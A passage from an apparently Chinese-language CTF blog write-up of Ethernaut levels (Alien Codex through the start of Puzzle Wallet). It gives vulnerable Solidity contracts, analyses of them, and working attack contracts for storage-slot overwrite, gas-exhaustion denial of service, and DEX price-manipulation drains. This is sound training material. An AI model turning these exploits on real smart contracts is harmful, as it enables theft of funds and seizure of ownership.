    function revise(uint256 i, bytes32 _content) public contacted &#123;
        codex[i] = _content;
    &#125;
&#125;
</code></pre>
<h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h3><p>You’ve uncovered an Alien contract. Claim ownership to complete the level.</p>
<p> Things that might help</p>
<ul>
<li>Understanding how array storage works</li>
<li>Understanding <a class="link"   href="https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html" >ABI specifications <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Using a very <code>underhanded</code> approach</li>
</ul>
<h3 id="Analysis-6"><a href="#Analysis-6" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目要求获取所有权，那么我们要先找到题目合约所继承的 Ownable-05.sol 合约，看看是什么。</p>
<p>去 Ethernaut 的 Github 仓库获取代码：</p>
<pre><code class="solidity">pragma solidity ^0.5.0;

contract Ownable &#123;
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal &#123;
        _owner = msg.sender;
    &#125;

    function owner() public view returns (address) &#123;
        return _owner;
    &#125;

    modifier onlyOwner() &#123;
        require(isOwner(), &quot;Ownable: caller is not the owner&quot;);
        _;
    &#125;

    function isOwner() public view returns (bool) &#123;
        return msg.sender == _owner;
    &#125;

    function renounceOwnership() public onlyOwner &#123;
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    &#125;

    function transferOwnership(address newOwner) public onlyOwner &#123;
        _transferOwnership(newOwner);
    &#125;

    function _transferOwnership(address newOwner) internal &#123;
        require(newOwner != address(0), &quot;Ownable: new owner is the zero address&quot;);
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    &#125;
&#125;
</code></pre>
<p>那么对于成为 owner 这件事情，我们就有头绪了，关键就是要篡改这里面的 _owner 成员变量。</p>
<p>这里需要搞清楚动态数组在 EVM 中的存储机制，首先按照存储布局规则确定一个存放该动态数组的插槽 p，这个插槽中存放的是动态数组的元素数量。而元素的值从插槽 keccak256(p) 开始存储，而 EVM 的存储只有 2^256^ 个插槽，当插槽下标大于 2^256^-1 时就会溢出到 0。由于 EVM 并不会验证数组的 ABI 编码中的长度与实际有效负载长度是否匹配，我们可以在 codex.length 为 0 的时候调用 retract() 导致数组长度下溢出，从而变成 32 字节所能存储的最大的无符号整数：2^256^-1。</p>
<p>以上是我们能对动态数组 codex 进行的操作，接下来回到实际的存储中，看看最终导致的结果：</p>
<p>按照存储布局规则，存储的顺序是 父合约的 _owner (20 Bytes)、本合约的 contact (1 Btye)、本合约的 codex (32 Bytes，实际存的是 codex.length)。那么 codex 的长度就会存在 slot1 中（即上文的 p 为 1），而 codex 的元素则会从下标为 keccak(1) 的插槽开始存储，而 codex 一个元素占 32 字节，所以一个插槽刚好存储一个元素。</p>
<p>回到刚才让 codex 下溢出的情况，codex.length 为 2^256^-1，而 keccak(1) 是一个极大的整数，所以必然会导致插槽下标溢出，导致所有的插槽都能被 codex 的长度值和元素所控制。我们看看这个情况下存储的情况：</p>
<table>
<thead>
<tr>
<th>插槽下标</th>
<th>存储内容</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>_owner 和 contact</td>
</tr>
<tr>
<td>1</td>
<td>codex.length</td>
</tr>
<tr>
<td>……</td>
<td>……</td>
</tr>
<tr>
<td>keccak(1)</td>
<td>codex[0]</td>
</tr>
<tr>
<td>……</td>
<td>……</td>
</tr>
<tr>
<td>2^256^-1</td>
<td>codex[2^256^-1-keccak(1)]</td>
</tr>
</tbody></table>
<p>很明显，如果插槽下标溢出，则 codex[2^256^-1-keccak(1)+1] 会被储存在 slot0 中，也就是可以控制 _owner 状态变量了。</p>
<h3 id="Exploit-5"><a href="#Exploit-5" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<pre><code class="solidity">contract Hack &#123;
    AlienCodex public codex;
    bytes32 public payload;
    uint public i;

    constructor(address _target) public &#123;
        codex = AlienCodex(_target);
    &#125;

    function attack() public &#123;
        i = 2 ** 256 - 1 - uint(keccak256(abi.encode(1))) + 1;
        payload = bytes32(uint256(uint160(tx.origin)));
        codex.makeContact();
        codex.retract();
        codex.revise(i, payload);
    &#125;
&#125;
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402062044128.png"
                      alt="image-20240206204425033"
                ></p>
<h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20 Denial"></a>20 Denial</h2><h3 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial &#123;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public &#123;
        partner = _partner;
    &#125;

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public &#123;
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    &#125;

    // allow deposit of funds
    receive() external payable &#123;&#125;

    // convenience function
    function contractBalance() public view returns (uint256) &#123;
        return address(this).balance;
    &#125;
&#125;
</code></pre>
<h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h3><p>This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</p>
<p>If you can deny the owner from withdrawing funds when they call <code>withdraw()</code> (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</p>
<h3 id="Analysis-7"><a href="#Analysis-7" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目要求不能让 owner 拿到钱。</p>
<p>这里我第一反应是把 partner 的交易 revert 掉，但是 call 并不会检查返回值，所以即使 revert 也不会影响到给 owner 的转账。那么我们就需要在 partner 合约的 fallback 函数下文章，在这里把 gas 耗尽就可以达到目的了。</p>
<h3 id="Exploit-6"><a href="#Exploit-6" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Denial &#123;
    function contractBalance() external view returns (uint256);

    function owner() external view returns (address);

    function partner() external view returns (address);

    function setWithdrawPartner(address _partner) external;

    function withdraw() external;

    receive() external payable;
&#125;

contract Hack &#123;
    Denial public myD;

    constructor(address payable _target) public &#123;
        myD = Denial(_target);
        myD.setWithdrawPartner(address(this));
    &#125;

    receive() external payable &#123;
        while(true) &#123;&#125;
    &#125;
&#125;
</code></pre>
<p>在靶场上提交容器的时候，后台会调用 withdraw 方法并验证：</p>
<pre><code class="solidity">function validateInstance(address payable _instance, address _player) public override returns (bool) &#123;
    _player;
    Denial instance = Denial(_instance);
    if (address(instance).balance &lt;= 100 wei) &#123;
        // cheating otherwise
        return false;
    &#125;
    // fix the gas limit for this call
    (bool result, ) = address(instance).call&#123;gas: 1000000&#125;(abi.encodeWithSignature(&quot;withdraw()&quot;)); // Must revert
    return !result;
&#125;
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402071620819.png"
                      alt="image-20240207162032733"
                ></p>
<h2 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21 Shop"></a>21 Shop</h2><h3 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer &#123;
    function price() external view returns (uint256);
&#125;

contract Shop &#123;
    uint256 public price = 100;
    bool public isSold;

    function buy() public &#123;
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;
            isSold = true;
            price = _buyer.price();
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h3><p>Сan you get the item from the shop for less than the price asked?</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li><code>Shop</code> expects to be used from a <code>Buyer</code></li>
<li>Understanding restrictions of view functions</li>
</ul>
<h3 id="Analysis-8"><a href="#Analysis-8" class="headerlink" title="Analysis"></a>Analysis</h3><p>注意不要被套入题目要求的思维定式，我们不需要以较小的 price 来绕过，而是 return 不同的 price 值。</p>
<p>看看题目后台的验证代码就知道了：</p>
<pre><code class="solidity">function validateInstance(address payable _instance, address) public view override returns (bool) &#123;
    Shop _shop = Shop(_instance);
    return _shop.price() &lt; 100;
&#125;
</code></pre>
<p>我们可以使题目后台合约和题目合约调用 price 时获取到不同的返回值，从而满足题目的要求。</p>
<h3 id="Exploit-7"><a href="#Exploit-7" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop &#123;
    function buy() external;

    function isSold() external view returns (bool);
&#125;

contract Buyer &#123;
    Shop public shop;

    constructor(address _target) public &#123;
        shop = Shop(_target);
    &#125;

    function price() external view returns (uint256) &#123;
        if (shop.isSold() == false) &#123;
            return 100;
        &#125; else &#123;
            return 99;
        &#125;
    &#125;

    function attack() public &#123;
        shop.buy();
    &#125;
&#125;
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402071734294.png"
                      alt="image-20240207173423215"
                ></p>
<h2 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22 Dex"></a>22 Dex</h2><h3 id="Code-9"><a href="#Code-9" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;
import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;
import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;

contract Dex is Ownable &#123;
    address public token1;
    address public token2;

    constructor() &#123;&#125;

    function setTokens(address _token1, address _token2) public onlyOwner &#123;
        token1 = _token1;
        token2 = _token2;
    &#125;

    function addLiquidity(address token_address, uint256 amount)
        public
        onlyOwner
    &#123;
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    &#125;

    function swap(
        address from,
        address to,
        uint256 amount
    ) public &#123;
        require(
            (from == token1 &amp;&amp; to == token2) ||
                (from == token2 &amp;&amp; to == token1),
            &quot;Invalid tokens&quot;
        );
        require(
            IERC20(from).balanceOf(msg.sender) &gt;= amount,
            &quot;Not enough to swap&quot;
        );
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    &#125;

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) &#123;
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    &#125;

    function approve(address spender, uint256 amount) public &#123;
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    &#125;

    function balanceOf(address token, address account)
        public
        view
        returns (uint256)
    &#123;
        return IERC20(token).balanceOf(account);
    &#125;
&#125;

contract SwappableToken is ERC20 &#123;
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) &#123;
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    &#125;

    function approve(
        address owner,
        address spender,
        uint256 amount
    ) public &#123;
        require(owner != _dex, &quot;InvalidApprover&quot;);
        super._approve(owner, spender, amount);
    &#125;
&#125;
</code></pre>
<h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h3><p>The goal of this level is for you to hack the basic <a class="link"   href="https://en.wikipedia.org/wiki/Decentralized_exchange" >DEX <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> contract below and steal the funds by price manipulation.</p>
<p>You will start with 10 tokens of <code>token1</code> and 10 of <code>token2</code>. The DEX contract starts with 100 of each token.</p>
<p>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.</p>
<p><strong>Quick note</strong></p>
<p>Normally, when you make a swap with an ERC20 token, you have to <code>approve</code> the contract to spend your tokens for you. To keep with the syntax of the game, we’ve just added the <code>approve</code> method to the contract itself. So feel free to use <code>contract.approve(contract.address, &lt;uint amount&gt;)</code> instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the <code>SwappableToken</code> contract otherwise.</p>
<p> Things that might help:</p>
<ul>
<li>How is the price of the token calculated?</li>
<li>How does the <code>swap</code> method work?</li>
<li>How do you <code>approve</code> a transaction of an ERC20?</li>
<li>Theres more than one way to interact with a contract!</li>
<li>Remix might help</li>
<li>What does “At Address” do?</li>
</ul>
<h3 id="Analysis-9"><a href="#Analysis-9" class="headerlink" title="Analysis"></a>Analysis</h3><p>关卡要求掏空交易所里两种代币的其中的至少一种，看到汇率的计算方式，决定从这里入手：</p>
<pre><code class="solidity">function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) &#123;
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
&#125;
</code></pre>
<p>该函数的大概意思是将交易所拥有的两种代币的比值当作汇率，问题就出在这里。使用余额作为计算价格的因素，会导致价格可控，被恶意利用。</p>
<p>假设一下，我们把手上的 token2 都换成 token1，这时我们有 20 个 token1，交易所有 90 个 token1，110 个 token2。那么我们把这 20 个 token1 又换成token2，重复几遍，就会发生奇妙的事情：</p>
<pre><code>swapAmount = 20 * 110 / 90 = 24.44444 ≈ 24
           = 24 * 110 / 86 = 30.69767 ≈ 30
           = 30 * 110 / 80 = 41.25000 ≈ 41
</code></pre>
<p>那么继续下去就能掏空一种代币了。</p>
<h3 id="Exploit-8"><a href="#Exploit-8" class="headerlink" title="Exploit"></a>Exploit</h3><p>有点像滚烫开水的降温法术（就是用两个杯子来回倒</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403070106661.png"
                      alt="image-20240307010605583"
                ></p>
<p>成功掏空了 token1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403070112218.png"
                      alt="image-20240307011212159"
                ></p>
<h2 id="23-Dex-Two"><a href="#23-Dex-Two" class="headerlink" title="23 Dex Two"></a>23 Dex Two</h2><h3 id="Code-10"><a href="#Code-10" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;
import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;
import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;

contract DexTwo is Ownable &#123;
    address public token1;
    address public token2;

    constructor() &#123;&#125;

    function setTokens(address _token1, address _token2) public onlyOwner &#123;
        token1 = _token1;
        token2 = _token2;
    &#125;

    function add_liquidity(address token_address, uint256 amount)
        public
        onlyOwner
    &#123;
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    &#125;

    function swap(
        address from,
        address to,
        uint256 amount
    ) public &#123;
        require(
            IERC20(from).balanceOf(msg.sender) &gt;= amount,
            &quot;Not enough to swap&quot;
        );
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    &#125;

    function getSwapAmount(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) &#123;
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    &#125;

    function approve(address spender, uint256 amount) public &#123;
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    &#125;

    function balanceOf(address token, address account)
        public
        view
        returns (uint256)
    &#123;
        return IERC20(token).balanceOf(account);
    &#125;
&#125;

contract SwappableTokenTwo is ERC20 &#123;
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) &#123;
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    &#125;

    function approve(
        address owner,
        address spender,
        uint256 amount
    ) public &#123;
        require(owner != _dex, &quot;InvalidApprover&quot;);
        super._approve(owner, spender, amount);
    &#125;
&#125;
</code></pre>
<h3 id="Description-10"><a href="#Description-10" class="headerlink" title="Description"></a>Description</h3><p>This level will ask you to break <code>DexTwo</code>, a subtlely modified <code>Dex</code> contract from the previous level, in a different way.</p>
<p>You need to drain all balances of token1 and token2 from the <code>DexTwo</code> contract to succeed in this level.</p>
<p>You will still start with 10 tokens of <code>token1</code> and 10 of <code>token2</code>. The DEX contract still starts with 100 of each token.</p>
<p> Things that might help:</p>
<ul>
<li>How has the <code>swap</code> method been modified?</li>
</ul>
<h3 id="Analysis-10"><a href="#Analysis-10" class="headerlink" title="Analysis"></a>Analysis</h3><p>这一关要求掏空交易所拥有的两种代币，与上一关相比，修改了 swap 函数，使其跳过了验证代币的步骤。如此，我们可以自己部署代币合约，以操纵价格。</p>
<p>部署一个 ERC20 代币合约，用它把 token1 和 token2 换出就好：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;

contract BeeCoin is ERC20 &#123;
    address public dex;

    constructor(
        address _dex,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) &#123;
        _mint(msg.sender, initialSupply);
        dex = _dex;
        _mint(dex, 1);
    &#125;
&#125;
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403091449397.png"
                      alt="image-20240309144919308"
                ></p>
<h2 id="24-Puzzle-Wallet"><a href="#24-Puzzle-Wallet" class="headerlink" title="24 Puzzle Wallet"></a>24 Puzzle Wallet</h2><h3 id="Code-11"><a href="#Code-11" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import &quot;../helpers/UpgradeableProxy-08.sol&quot;;

contract PuzzleProxy is UpgradeableProxy &#123;
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;
        admin = _admin;
    &#125;

    modifier onlyAdmin &#123;
      require(msg.sender == admin, &quot;Caller is not the admin&quot;);
      _;
    &#125;

    function proposeNewAdmin(address _newAdmin) external &#123;
        pendingAdmin = _newAdmin;
    &#125;

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;
        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);
        admin = pendingAdmin;
    &#125;

    function upgradeTo(address _newImplementation) external onlyAdmin &#123;
        _upgradeTo(_newImplementation);
    &#125;
&#125;

contract PuzzleWallet &#123;
    address public owner;
    uint256 public maxBalance;
    mapping(address =&gt; bool) public whitelisted;
    mapping(address =&gt; uint256) public balances;

    function init(uint256 _maxBalance) public &#123;
        require(maxBalance == 0, &quot;Already initialized&quot;);
        maxBalance = _maxBalance;
        owner = msg.sender;
    &#125;

    modifier onlyWhitelisted &#123;
        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);
        _;
    &#125;

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;
      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);
      maxBalance = _maxBalance;
    &#125;

    function addToWhitelist(address addr) external &#123;
        require(msg.sender == owner, &quot;Not the owner&quot;);
        whitelisted[addr] = true;
    &#125;

    function deposit() external payable onlyWhitelisted &#123;
      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);
      balances[msg.sender] += msg.value;
    &#125;

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;
        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);
        balances[msg.sender] -= value;
        (bool success, ) = to.call&#123; value: value &#125;(data);
        require(success, &quot;Execution failed&quot;);
    &#125;

    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;
        bool depositCalled = false;
        for (uint256 i = 0; i &lt; data.length; i++) &#123;
            bytes memory _data = data[i];
            bytes4 selector;
            assembly &#123;
                selector := mload(add(_data, 32))
            &#125;
            if (selector == this.deposit.selector) &#123;
                require(!depositCalled, &quot;Deposit can only be called once&quot;);
                // Protect against reusing msg.value
                depositCalled = true;
            &#125;
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, &quot;Error while delegating call&quot;);
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="Description-11"><a href="#Description-11" class="headerlink" title="Description"></a>Description</h3><p>Nowadays, paying for DeFi operations is impossible, fact.</p>
<p>A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.</p>
<p>They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.</p>
<p>Little did they know, their lunch money was at risk…</p>
<p> You’ll need to hijack this wallet to become the admin of the proxy.</p>
<p> Things that might help:</p>
<ul>
<li>Understanding how <code>delegatecall</code> works and how <code>msg.sender</code> and <code>msg.value</code> behaves when performing one.</li>
<li>Knowing about proxy patterns and the way they handle storage variables.</li>
</ul>
<h3 id="Analysis-11"><a href="#Analysis-11" class="headerlink" title="Analysis"></a>Analysis</h3><p>这一关的重点在于代理合约、可升级合约的概念，以及对<code>delegatecall</code>性质的理解。</p>
<p>简单来说，PuzzleWallet 合约中的 multicall 函数使用了 delegatecall，这会导致委托调用其他合约的函数时，自身的存储被修改。正好在 PuzzleProxy </p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
</search>
